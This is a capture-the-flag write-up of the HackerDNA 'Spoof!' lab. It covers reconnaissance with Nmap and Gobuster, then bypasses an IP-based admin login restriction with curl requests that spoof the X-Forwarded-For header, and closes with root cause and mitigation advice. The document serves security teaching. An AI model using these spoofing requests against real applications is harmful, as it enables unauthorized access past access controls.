1. Overview
Spoof! is a HackerDNA web security lab focused on HTTP headers, client IP identification, access control, and trust boundaries.
The application provides an administrative login page that restricts access based on the client's IP address. External users are required to provide a password, while users connecting from the company's network are treated differently.
During the assessment, the application was found to trust the X-Forwarded-For HTTP header when determining the client's IP address.
Because this header could be directly controlled by the client, it was possible to manipulate the IP address perceived by the application and bypass the external-access restriction.
The main security concepts involved were:
HTTP request manipulation
X-Forwarded-For
Client IP identification
Broken access control
Improper trust in client-controlled headers
Security decisions based on untrusted input
Authentication/access-control bypass

2. Objective
The objective of the lab was to analyze the TechSolutions administrative login application, understand how it determined whether a user was connecting from the company network, identify a weakness in this mechanism, and exploit it to bypass the external-access restriction and obtain the flag.
The key question during the assessment was:
How does the application determine whether the client is connecting from the company network?
The final objective was achieved by manipulating the X-Forwarded-For header to make the application interpret the request as originating from the trusted company IP.

3. Environment
Platform: HackerDNA
Lab: Spoof!
Target: lab-3-253-52-131.hdna.me
Attacker machine: Linux 
Operating System: Linux
Web Server: Apache/2.4.57 (Debian)
Backend: PHP/8.3.4
Proxy/CDN: Cloudflare
Tools: Nmap, Gobuster, cURL, browser

4. Reconnaissance
The first step was to identify the exposed services on the target.
An Nmap scan was performed against the target:
```bash
nmap -Pn <TARGET_IP>
```

The scan identified the following relevant services:
```text
53/tcp open  domain
80/tcp open  http
```

The HTTP service exposed an Apache web server.
Further service enumeration identified:
Apache/2.4.57 (Debian)

The operating system fingerprint indicated:
Linux 4.15 - 5.6

The web application title was:
Admin Login - TechSolutions

The HTTP response headers also revealed:
```http
Server: Apache/2.4.57 (Debian)
X-Powered-By: PHP/8.3.4
Content-Type: text/html; charset=UTF-8
```

This established that the target was a Linux server running Apache with a PHP-based web application.

5. Enumeration
5.1 Open Ports
The initial Nmap scan identified:
```text
53/tcp  open  domain
80/tcp  open  http
```

Port 80 was the main attack surface because it hosted the TechSolutions web application.

5.2 Web Server and Technologies
The HTTP service was identified as:
Apache/2.4.57 (Debian)

The application disclosed:
PHP/8.3.4

The application was therefore identified as a PHP web application running on Apache.

5.3 Directory Enumeration
Gobuster was used to enumerate common web resources:
```bash
gobuster dir -u http://<TARGET_IP>/ \
-w /usr/share/wordlists/dirb/common.txt
```

The following resources were identified:
```text
/index.php       200
/server-status   403
```

The /server-status endpoint existed but returned:
403 Forbidden

Therefore, it was not directly accessible from my position.

5.4 robots.txt and sitemap.xml
The following common files were also checked:
```text
/robots.txt
/sitemap.xml
```

Both returned:
404 Not Found

No useful information was obtained from these files.

5.5 Main Application
The main application was located at:
/index.php

The page displayed an administrative login interface.
The application showed information similar to:
```text
TechSolutions

Your IP: <ATTACKER_IP>

You are not connecting from company network.

Password is required of external access.
```

This was a significant discovery because the application was explicitly making an access-control decision based on the client's IP address.
This led to the following hypothesis:
The application may be using the client's IP address as part of its authorization logic.

5.6 Form Enumeration
The HTML source of the application was downloaded using cURL:
```bash
curl -sk https://<TARGET_IP>/index.php -o /tmp/spoof.html
```

The relevant HTML elements were then identified:
```bash
grep -inE 'form|input|button|password|action|method|name|script' /tmp/spoof.html
```

The application contained the following form structure:
```html
<form action="index.php" method="POST">
```

The password field was:
```html
<input type="password" placeholder="Password" name="password" required>
```

This established that the login request used:
POST /index.php

with:
password=<value>

No JavaScript-based request mechanism was identified.

6. Vulnerability Identification
The main vulnerability was improper trust in the X-Forwarded-For HTTP header.
The application used the client's reported IP address as part of an access-control decision.
The initial behavior suggested that external users were required to provide a password:
You are not connecting from company network.

Password is required of external access.

The investigation then tested whether the IP displayed by the application could be manipulated.
The following request was sent:
```bash
curl -ski \
-H "X-Forwarded-For: 127.0.0.1" \
https://<TARGET_IP>/index.php
```

The application responded with:
Your IP: 127.0.0.1

This confirmed that the application was accepting the attacker-controlled X-Forwarded-For value as the client's IP.
However, 127.0.0.1 did not bypass the restriction:
You are not connecting from company network.

Therefore, the important discovery was not that 127.0.0.1 was considered trusted.
The important discovery was:
The application trusted a value that could be controlled by the client.
The security decision therefore relied on untrusted input.

7. Exploitation
Step 1 — Reproduce the login request
After identifying the form, the login mechanism was reproduced using cURL.
A test password was submitted:
```bash
curl -sk -X POST \
-d 'password=teste' \
https://<TARGET_IP>/index.php
```

The purpose of this request was to establish the normal behavior of the application when accessed externally.

Step 2 — Test the X-Forwarded-For header
The application appeared to display the client's IP.
To determine whether this value could be manipulated, the following request was sent:
```bash
curl -sk \
-H "X-Forwarded-For: 127.0.0.1" \
https://<TARGET_IP>/index.php
```

The application displayed:
Your IP: 127.0.0.1

This demonstrated that the application was trusting the header.
The actual network connection had not changed.
Only the HTTP header had changed.
Conceptually:
```text
Attacker's real connection
          ↓
HTTP request
          ↓
X-Forwarded-For: 127.0.0.1
          ↓
Application
          ↓
"Your IP: 127.0.0.1"
```


Step 3 — Identify the trusted IP
The application itself provided an important clue in its message:
You are not connecting from company network.

This indicated that:
<TARGET_IP>

was associated with the trusted company network in the lab.
This value became the next candidate for the X-Forwarded-For test.

Step 4 — Spoof the trusted IP
A POST request was then sent while setting the X-Forwarded-For header to the trusted IP:
```bash
curl -skLi -X POST \
-H 'X-Forwarded-For: <TRUSTED_IP>' \
-d 'password=teste' \
http://<TARGET_IP>/
```

The exact target IP changed during the lab, but the important part of the exploit was:
X-Forwarded-For: <TRUSTED_IP>

The server returned:
HTTP/1.1 302 Found

This was a significant change from the previous behavior.

Step 5 — Follow the redirect
The -L option was used with cURL:
```bash
curl -skLi -X POST \
-H 'X-Forwarded-For: <TRUSTED_IP>' \
-d 'password=teste' \
http://<TARGET_IP>/
```

The -L option instructs cURL to follow HTTP redirects.
The application redirected the request after accepting the spoofed trusted IP, and the final response exposed the lab flag.
The password itself was therefore not the key to completing the challenge.
The vulnerability was the ability to bypass the external-access restriction by manipulating the client IP used by the application.

8. Access-control Bypass
The initial state was:
```text
External attacker
        ↓
Application identifies external IP
        ↓
Password required
        ↓
Access restricted
```

The vulnerability allowed the attacker to modify the IP perceived by the application:
```text
External attacker
        ↓
X-Forwarded-For: <TRUSTED_IP>
        ↓
Application trusts supplied IP
        ↓
Request interpreted as trusted
        ↓
External-access restriction bypassed
        ↓
HTTP 302
        ↓
FLAG
```

9. Proof of Compromise
The successful exploitation was confirmed by the server returning:
HTTP/1.1 302 Found

after the request was sent with the spoofed trusted IP.
Following the redirect resulted in the lab flag being returned.
The flag itself is intentionally omitted from this public write-up.
The key proof of exploitation was therefore:
X-Forwarded-For: <TRUSTED_IP>

combined with the successful change in application behavior and retrieval of the flag.
No real credentials, tokens, API keys, or personal information are included in this write-up.

10. Attack Chain
The complete attack chain was:
```text
Reconnaissance
      ↓
Nmap
      ↓
Apache / PHP Discovery
      ↓
Web Enumeration
      ↓
Admin Login Identified
      ↓
Application Uses Client IP
      ↓
X-Forwarded-For Tested
      ↓
Client IP Successfully Manipulated
      ↓
Trusted Company IP Identified
      ↓
X-Forwarded-For Spoofed
      ↓
Access-Control Bypass
      ↓
HTTP 302 Redirect
      ↓
FLAG

```

11. Root Cause
The root cause was trusting client-controlled HTTP data when making a security-sensitive access-control decision.
The X-Forwarded-For header is commonly used by reverse proxies and load balancers to communicate the original client's IP address to backend applications.
However, the application incorrectly trusted this value without adequately verifying that it had been supplied by a trusted proxy.
An attacker could therefore send:
X-Forwarded-For: <trusted IP>

and cause the application to interpret the request as originating from a trusted network.
The fundamental security problem was:
```text
Untrusted client input
        ↓
X-Forwarded-For
        ↓
Application trusts value
        ↓
Security decision
        ↓
Access-control bypass
```

The application effectively treated a piece of attacker-controlled HTTP data as trustworthy identity information.

12. Mitigation
The application should not rely directly on a client-controlled X-Forwarded-For header for authentication or authorization decisions.
12.1 Only trust headers from known proxies
If the application is deployed behind a reverse proxy or load balancer, the backend should only trust forwarded client IP information when the request comes from a configured, trusted proxy.
For example:
```text
Internet
    ↓
Trusted Reverse Proxy
    ↓
Application
```

The application should not blindly accept:
X-Forwarded-For: <attacker-controlled value>

from arbitrary Internet clients.

12.2 Configure the infrastructure correctly
The web server, reverse proxy, framework, or application should be configured to correctly determine the original client IP.
The trusted proxy list should be explicitly defined.

12.3 Do not use client IP as the sole authentication mechanism
Network-based restrictions can be useful as an additional security layer, but they should not replace proper authentication and authorization.
An administrative application should use mechanisms such as:
```text
Strong authentication
Proper session management
Authorization controls
MFA where appropriate
Secure network controls
```
rather than relying solely on a client-supplied IP address.

12.4 Validate security-sensitive input
Any value used in an authorization decision must have a trustworthy source.
Client-controlled HTTP headers should be treated as untrusted unless their provenance has been established by the application's trusted infrastructure.

13. Lessons Learned
1. HTTP headers can influence application behavior
HTTP headers are not necessarily trustworthy simply because they are part of an HTTP request.
An attacker can construct their own requests and supply arbitrary header values.

2. X-Forwarded-For does not change the real IP address
This was one of the most important concepts demonstrated by the lab.
When we sent:
```http
X-Forwarded-For: 127.0.0.1
```

we did not change the IP address of the attacker's network interface.
We only changed the value presented to the application.
Real network IP
      ≠
X-Forwarded-For value


3. 127.0.0.1 is the loopback address
127.0.0.1 represents the local machine's loopback interface.
It is not the IP address of the attacker's network interface.
In this lab, it was useful as a diagnostic value because the application displayed:
Your IP: 127.0.0.1

This proved that the application was processing the supplied header.

4. Changing the displayed IP was not enough
The first spoofing attempt used:
```http
X-Forwarded-For: 127.0.0.1
```

Although the application accepted the value, it still considered the connection external.
This demonstrated the importance of distinguishing between:
Can I control the value?

and:
Can I control the security decision?

The first was confirmed before the second.

5. Error and informational messages can reveal useful information
The application disclosed the IP associated with the company network:
<TARGET_IP>

This information helped identify the value needed for the next stage of testing.
In a real application, exposing internal trust information through error or informational messages could assist attackers during reconnaissance.

6. cURL can replace graphical interception tools
Burp Suite was unavailable in the attacker's Chromebook environment, but the entire relevant HTTP investigation could still be performed using cURL.
For example:
```bash
curl -ski \
-H 'X-Forwarded-For: 127.0.0.1' \
https://<TARGET_IP>/index.php
```

and:
```bash
curl -skLi -X POST \
-H 'X-Forwarded-For: <TRUSTED_IP ' \
-d 'password=teste' \
http://<TARGET_IP>/
```

This reinforced an important penetration-testing skill:
Understanding HTTP requests is more important than depending on a particular tool.

7. The most important lesson
Never trust client-controlled data when making security-sensitive decisions without verifying its origin.
The complete vulnerability can be summarized as:
```text
Attacker-controlled header
          ↓
X-Forwarded-For
          ↓
Application trusts it
          ↓
IP-based access-control decision
          ↓
Trusted IP spoofed
          ↓
Access-control bypass
          ↓
FLAG
```

This pattern is applicable far beyond this particular CTF and is an important concept when testing real-world web applications.
